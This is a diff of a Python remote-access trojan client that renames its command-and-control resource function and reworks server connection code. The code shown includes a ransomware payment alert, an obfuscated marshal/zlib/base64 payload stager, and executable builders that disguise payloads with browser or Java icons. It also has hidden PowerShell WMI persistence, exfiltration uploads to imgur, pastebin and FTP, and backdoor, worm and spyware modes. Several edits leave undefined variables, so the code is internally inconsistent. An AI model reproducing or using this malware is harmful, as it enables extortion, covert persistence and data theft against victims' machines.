@@ -599,7 +599,7 @@ class Client():
 
     def _upload_imgur(self, source):
         try:
-            api_key  = self._server_request('api imgur api_key')
+            api_key  = self._server_resource('api imgur api_key')
             if api_key: 
                 data = self._get_normalized_data(source)
                 post = self._get_post_request('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})
@@ -612,7 +612,7 @@ class Client():
 
     def _upload_pastebin(self, source):
         try:
-            api = self._server_request('api pastebin')
+            api = self._server_resource('api pastebin')
             if api:
                 data = self._get_normalized_data(source)
                 info = {'api_option': 'paste', 'api_paste_code': data}
@@ -628,7 +628,7 @@ class Client():
 
     def _upload_ftp(self, source, filetype=None):
         try:
-            creds = self._server_request('api ftp')
+            creds = self._server_resource('api ftp')
             if creds:
                 path  = ''
                 local = time.ctime().split()
@@ -665,7 +665,7 @@ class Client():
     def _ransom_payment(self, session_id=None):
         try:
             if os.name is 'nt':
-                alert = self._get_windows_alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session_id, self._server_request('api ransom payment')), "Windows Alert")
+                alert = self._get_windows_alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session_id, self._server_resource('api ransom payment')), "Windows Alert")
                 return "Launched a Windows Message Box with ransom payment information"
             else:
                 return "{} does not yet support {} platform".format(self._ransom_payment.func_name, sys.platform)
@@ -763,8 +763,8 @@ class Client():
     def _sms_send(self, phone_number, message):
         try:
             phone_number = '+{}'.format(str().join([i for i in str(phone_number) if str(i).isdigit()]))
-            cli = twilio.rest.Client(self._server_request('api twilio account_sid'), self._server_request('api twilio auth_token'))
-            msg = cli.api.account.messages.create(to=phone_number, from_=self._server_request('api twilio phone_number'), body=message)
+            cli = twilio.rest.Client(self._server_resource('api twilio account_sid'), self._server_resource('api twilio auth_token'))
+            msg = cli.api.account.messages.create(to=phone_number, from_=self._server_resource('api twilio phone_number'), body=message)
             return "SUCCESS: text message sent to {}".format(phone_number)
         except Exception as e:
             return "{} error: {}".format(self._sms_send.func_name, str(e))
@@ -887,7 +887,7 @@ class Client():
             sock.settimeout(1.0)
             sock.connect((host,int(port)))
             data = sock.recv(1024)
-            network_services = json.loads(self._server_request('resource ports'))
+            network_services = json.loads(self._server_resource('resource ports'))
             if data and network_services:
                 info = network_services
                 data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
@@ -1019,11 +1019,11 @@ class Client():
     @config(platforms=['win32','linux2','darwin'])
     def _payload_stager(self, *args, **kwargs):
         try:
-            config  = self._server_request('resource stager config')
+            config  = self._server_resource('resource stager config')
             if config:
-                code = self._server_request('resource stager code')
+                code = self._server_resource('resource stager code')
                 if code:
-                    code = ['#!/usr/bin/python',"from __future__ import print_function", self._server_request('stager code'), "if __name__=='__main__':", "\t_debug=bool('--debug' in sys.argv or 'debug' in sys.argv)", '\tmain(config="{}")'.format(json.loads(self._server_request('stager config')).get('r'))]
+                    code = ['#!/usr/bin/python',"from __future__ import print_function", self._server_resource('stager code'), "if __name__=='__main__':", "\t_debug=bool('--debug' in sys.argv or 'debug' in sys.argv)", '\tmain(config="{}")'.format(json.loads(self._server_resource('stager config')).get('r'))]
                     data = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile('\n'.join(code), '', 'exec')), 9))))
                     path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
                     with file(path, 'w') as fp:
@@ -1054,10 +1054,10 @@ class Client():
             dist    = os.path.dirname(path)
             key     = self._get_random_var(16)
             apps    = [i for i in ['flash','java','chrome','firefox','safari','explorer','edge','word','excel','pdf'] if i in name]
-            appicon = self._server_request('resource icon %s' % apps[0]) if len(apps) else self._server_request('resource icon java')
+            appicon = self._server_resource('resource icon %s' % apps[0]) if len(apps) else self._server_resource('resource icon java')
             icon    = self.wget(appicon) if os.name != 'nt' else os.path.splitdrive(self.wget(appicon))[1].replace('\\','/')
-            pkgs    = list(set([i.strip().split()[1] for i in open(path).read().splitlines() if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in urllib.urlopen(json.loads(self._server_request('stager config')).get('w')).read().splitlines() if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
-            spec    = self._server_request('resource stager spec').replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
+            pkgs    = list(set([i.strip().split()[1] for i in open(path).read().splitlines() if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in urllib.urlopen(json.loads(self._server_resource('stager config')).get('w')).read().splitlines() if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
+            spec    = self._server_resource('resource stager spec').replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
             fspec   = os.path.join(dist, name + '.spec')
             with file(fspec, 'w') as fp:
                 fp.write(spec)
@@ -1078,7 +1078,7 @@ class Client():
             if not kwargs.get('path'):
                 return "Error: missing keyword argument 'path'"                
             filename        = kwargs.get('path')
-            iconName        = kwargs.get('icon') if os.path.isfile(str(kwargs.get('icon'))) else self._server_request('resource icon %s.png' % random.choice(['flash','java','chrome','firefox']))
+            iconName        = kwargs.get('icon') if os.path.isfile(str(kwargs.get('icon'))) else self._server_resource('resource icon %s.png' % random.choice(['flash','java','chrome','firefox']))
             iconFile        = self.wget(iconName)
             version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
             baseName        = os.path.basename(filename)
@@ -1093,7 +1093,7 @@ class Client():
             executable      = os.path.join(distPath, filename)
             bundleVersion   = ' '.join(bundleName, version)
             bundleIdentity  = 'com.' + bundleName
-            infoPlist       = urllib2.urlopen(self._server_request('resource plist')).read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
+            infoPlist       = urllib2.urlopen(self._server_resource('resource plist')).read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
             os.makedirs(distPath)
             os.mkdir(rsrcPath)
             with file(pkgPath, "w") as fp:
@@ -1204,7 +1204,7 @@ class Client():
             if len(self._payload):
                 value = random.choice(self._payload)
                 if value and os.path.isfile(value):
-                    code    = self._server_request('resource bash')
+                    code    = self._server_resource('resource bash')
                     label   = name
                     if not os.path.exists('/var/tmp'):
                         os.makedirs('/var/tmp')
@@ -1352,7 +1352,7 @@ class Client():
                     cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
                 if cmd_line:
                     startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                    powershell = self._server_request('resource powershell').replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
+                    powershell = self._server_resource('resource powershell').replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
                     self._get_powershell_exec(powershell)
                     code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
                     result = self._get_powershell_exec(code)
@@ -1657,7 +1657,7 @@ class Client():
         try:
             if self._debug:
                 return socket.gethostbyname(socket.gethostname())
-            else:
+            elif 'config' in kwargs:
                 url, api = urllib.urlopen(kwargs.get('config')).read().splitlines()
                 req = urllib2.Request(url)
                 req.headers = {'API-Key': api}
@@ -1667,13 +1667,16 @@ class Client():
                     return ip
                 else:
                     self.debug("{} returned invalid IPv4 address: '{}'".format(self._get_server_addr.func_name, str(ip)))
+            else:
+                self.debug("{} error: missing API resources for finding active server".format(self._server_addr.func_name))
+                return 
         except Exception as e:
             self.debug("{} error: {}".format(self._server_addr.func_name, str(e)))
 
 
-    def _server_connect(self, port=1337):
+    def _server_connect(self, **kwargs):
         try:
-            host = self._server_addr()
+            host = self._server_addr(**kwargs)
             self._flags['connection'].clear()
             self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self._session['socket'].connect((host, port))
@@ -1698,33 +1701,40 @@ class Client():
                 self._flags['prompt'].clear()
 
 
-    def _server_request(self, request):
-        self.debug('sending request: %s' % request)
+    def _server_resource(self, resource):
+        self.debug('Requesting resource: %s' % resource)
         host, port = self._session['socket'].getpeername() 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((host, port + 1))
         task = {'client': self._sysinfo.get('id'), 'request':  request, 'result': ''}
         sock.sendall(self._aes_encrypt(json.dumps(task), self._session.get('key')) + '\n')
-        buf =  ""
-        attempts = 1
+        data =  ""
         while '\n' not in buf:
             try:
                 buf += sock.recv(4096)
             except (socket.error, socket.timeout):
-                if attempts <= 3:
-                    self.debug('Attempt %d failed - re-attempting to retreive resource from server' % attempts)
-                    attempts += 1
-                    continue
-                else:
-                    break
+                break
         if buf:
-            data = self._aes_decrypt(buf.rstrip(), self._session.get('key')).strip().rstrip()
+            data = self._aes_decrypt(data.rstrip(), self._session.get('key')).strip().rstrip()
             task = json.loads(data)
         try:
+            sock.shutdown(socket.SHUT_RDWR)
             sock.close()
         except: pass
         return task.get('result')
 
+    def _server_task(self, **kwargs):
+        try:
+            if self._flags['connection'].wait(timeout=3.0):
+                addr = self._session['socket'].getpeername()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1.0)
+                sock.connect((str(addr[0]), int(addr[1]) + 2))
+                sock.sendall(self._aes_encrypt(json.dumps(kwargs), self._session['key']) + '\n')
+            else:
+                self.debug("{} timed out".format(self._server_task.func_name))
+        except Exception as e:
+            self.debug("{} error: {}".format(self._server_task.func_name, str(e)))
 
     def _session_id(self):
         try:
@@ -1743,10 +1753,9 @@ class Client():
                         else:
                             break
                 if buf:
-                    data = self._aes_decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
-                    self._sysinfo = json.loads(data)
-                    self._session['id'] = self._sysinfo['session']
-                    return self._session['id']
+                    session = self._aes_decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
+                    self._session['id'] = self._sysinfo['session'] = session
+                    return session
             else:
                 self.debug("{} timed out".format(self._session_id.func_name))
         except Exception as e:
@@ -1975,7 +1984,6 @@ class Client():
         else:
             return "Invalid target URL - must begin with 'http'"
 
-            del _
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
     def kill(self, debug=False):
@@ -2139,7 +2147,7 @@ class Client():
         cmd, _, action = str(args).partition(' ')
         if not self._session['id']:
             return "{} error: {}".format(Client._ransom_payment.func_name, "no session ID")
-        if not self._server_request('api ransom payment'):
+        if not self._server_resource('api ransom payment'):
             return "{} error: {}".format(Client._ransom_payment.func_name, "no target URL")
         if 'payment' in cmd:
             return self._ransom_payment(self._session['id'])
@@ -2191,18 +2199,21 @@ class Client():
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='mode [option]')
-    def mode(self, *args, **kwargs):
+    def mode(self, mode=None):
         """
         display/change run mode (use 'mode help' for list of modes)
         """
         try:
-            if not args or 'help' in args:
-                return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("shell"): "interactive shell (backdoor mode)", "{:>12}".format("auto"): "autonomous (worm mode)", "{:>12}".format("passive"): "non-interactive recon (spyware mode)"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
+            if not mode:
+                return json.dumps({"mode": "active" if self._flags['mode'].is_set() else "passive"})
             else:
-                return self._get_mode(args[0])
+                if 'help' in mode:
+                    return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("active"): "interactive reverse TCP shell", "{:>12}".format("passive"): "auto-run tasks and save results"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
+                elif mode in ('active','passive'):
+                    return self._get_mode(mode)
         except Exception as e:
             self.debug("{} error: {}".format(self.passive.func_name, str(e)))
-            return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("shell"): "interactive shell (backdoor mode)", "{:>12}".format("auto"): "autonomous (worm mode)", "{:>12}".format("passive"): "non-interactive recon (spyware mode)"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
+            return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("active"): "interactive reverse TCP shell", "{:>12}".format("passive"): "auto-run tasks and save results"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -2254,7 +2265,7 @@ class Client():
         """
         try:
             if not args or 'help' in args:
-                return 'usage: {}\n\x20\x20\x20\x20kwargs\n\ticon: java, flash, firefox, chrome, safari\n\tname: up to 20 alphanumeric characters'.format(self.payload.usage)
+                return '\n    usage: payload -n <name> -i <icon>\n        -e/--executable     - compile a win32/win64 executable\n        -a/--application    - bundle into Mac OS X application \n        -r/--random         - generate random payload name\n        -n/--name [name]    - set a custom payload name\n        -i/--icon [icon]    - select icon {java, flash, pdf}'
             elif 'remove' in args:
                 output = {}
                 for payload in self._payload:
@@ -2471,7 +2482,7 @@ class Client():
         connect to server and start new session
         """
         try:
-            self._session['socket']     = self._server_connect()
+            self._session['socket']     = self._server_connect(**kwargs)
             self._session['key']        = self._session_key()
             self._session['id']         = self._session_id()
             self._session['public_key'] = self._get_public_key()
@@ -2481,12 +2492,12 @@ class Client():
         return self._get_restart(self.connect.func_name)
 
 
-    def run(self, mode='shell'):
+    def run(self, **kwargs):
         """
         run Client startup routine
         """
         try:
-            if self.connect():
+            if self.connect(**kwargs):
                 self._flags['mode'] = self._get_mode(mode)
                 self._workers[self._task_manager.func_name] = threading.Thread(target=self._task_manager, name=time.time())
                 self._workers[self._task_manager.func_name].daemon = True
